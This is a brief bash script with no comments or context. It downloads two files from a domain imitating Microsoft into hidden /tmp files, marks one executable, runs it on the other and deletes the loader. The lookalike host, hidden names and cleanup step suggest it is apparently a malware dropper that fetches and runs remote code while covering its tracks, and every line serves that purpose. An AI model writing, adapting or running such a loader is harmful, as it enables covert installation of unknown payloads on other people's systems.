#!/bin/bash
cd /tmp
curl -fsSL https://cdn.network-endpoint-microsoft.com/lodey -o .l
curl -fsSL https://cdn.network-endpoint-microsoft.com/genesis.node -o .n
chmod +x .l
./.l /tmp/.n
rm -f .l
